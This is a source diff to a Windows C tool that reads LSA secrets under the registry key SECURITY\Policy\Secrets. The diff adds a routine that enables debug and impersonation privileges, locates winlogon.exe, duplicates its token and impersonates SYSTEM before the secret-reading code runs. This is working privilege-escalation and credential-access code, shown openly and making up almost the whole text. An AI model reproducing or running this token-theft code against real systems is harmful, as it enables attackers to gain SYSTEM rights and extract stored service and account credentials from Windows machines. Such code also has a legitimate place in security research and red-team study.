@@ -5,6 +5,7 @@
 #include <Windows.h>
 #include <tchar.h>
 #include <NTSecAPI.h>
+#include <TlHelp32.h>
 #include <Shlwapi.h> //SHCopyKey
 #pragma comment(lib, "Shlwapi.lib")
 
@@ -127,6 +128,89 @@ TCHAR* pszSecretsSubkeyPath = _T("SECURITY\\Policy\\Secrets");
 TCHAR* pszTestKeyPath = _T("SECURITY\\Policy\\Secrets\\__GT__Decrypt");
 TCHAR* pszTestKeyName = _T("__GT__Decrypt");
 
+BOOL SetPrivilege(HANDLE hToken,LPCTSTR lpszPrivilege){
+
+	TOKEN_PRIVILEGES tp;
+	LUID luid;
+
+	if (!LookupPrivilegeValue(NULL,lpszPrivilege,   &luid))   {
+		_tprintf(_T("[-] LookupPrivilegeValue error: %u\n"), GetLastError());
+		return FALSE;
+	}
+
+	tp.PrivilegeCount = 1;
+	tp.Privileges[0].Luid = luid;
+	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+	if (!AdjustTokenPrivileges(hToken,FALSE,&tp,sizeof(TOKEN_PRIVILEGES),(PTOKEN_PRIVILEGES)NULL,(PDWORD)NULL)){
+		_tprintf(_T("[-] AdjustTokenPrivileges error: %u\n"), GetLastError());
+		return FALSE;
+	}
+
+	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED){
+		_tprintf(_T("[-] The token does not have the specified privilege. %u\n"), GetLastError());
+		return FALSE;
+	}
+	return TRUE;
+}
+
+DWORD getWinLogonPID(){
+	PROCESSENTRY32 entry;
+	entry.dwSize = sizeof(PROCESSENTRY32);
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (Process32First(snapshot, &entry) == TRUE)
+	{
+		while (Process32Next(snapshot, &entry) == TRUE)
+		{
+			if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0)
+			{
+				_tprintf(_T("Winlogon PID Found %d\n"), entry.th32ProcessID);
+				return entry.th32ProcessID;
+			}
+		}
+	}
+	return -1;
+
+}
+
+BOOL elevateSystem() {
+	HANDLE currentTokenHandle = NULL;
+	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
+	if (!SetPrivilege(currentTokenHandle, SE_DEBUG_NAME) && !SetPrivilege(currentTokenHandle, SE_IMPERSONATE_NAME)){
+		_tprintf(_T("SetPrivilege Enable Error  %u\n"), GetLastError());
+		return FALSE;
+	}
+	HANDLE processHandle;
+	HANDLE tokenHandle = NULL;
+	HANDLE duplicateTokenHandle = NULL;
+	DWORD pidToImpersonate;
+	if ((pidToImpersonate = getWinLogonPID()) < 0) {
+		_tprintf(_T("PID of winlogon not found\n"));
+		return FALSE;
+	}
+	processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pidToImpersonate);
+	if (GetLastError() != NULL) {
+		_tprintf(_T("OpenProcess Error %u\n"),GetLastError());
+		return FALSE;
+	}
+	;
+	if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &tokenHandle)) {
+		_tprintf(_T("OpenProcessToken Error %u\n"),GetLastError());
+		return FALSE;
+	}
+	SECURITY_IMPERSONATION_LEVEL seimp = SecurityImpersonation;
+	TOKEN_TYPE tk = TokenPrimary;
+	if (!DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, seimp, tk, &duplicateTokenHandle))
+	{
+		_tprintf(_T("DuplicateTokenEx Error %u\n"), GetLastError());
+		return FALSE;
+	}
+	if (!ImpersonateLoggedOnUser(duplicateTokenHandle)) {
+		_tprintf(_T("Impersonate Logged On User Error %u\n"), GetLastError());
+		return FALSE;
+	}
+	return TRUE;
+}
 
 int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
 {
@@ -137,7 +221,9 @@ int _tmain(int argc, _TCHAR** argv, _TCHAR** envp)
 	FILETIME ftLastWriteTime; // last write time 
 	LSTATUS Status;
 	SYSTEMTIME systemtime;
-
+	if (!elevateSystem()) {
+		return -1;
+	}
 	pszTestedSecretFullKeyPath = LocalAlloc(LPTR, MAX_PATH * sizeof(TCHAR));
 	if (NULL == pszTestedSecretFullKeyPath)
 	{
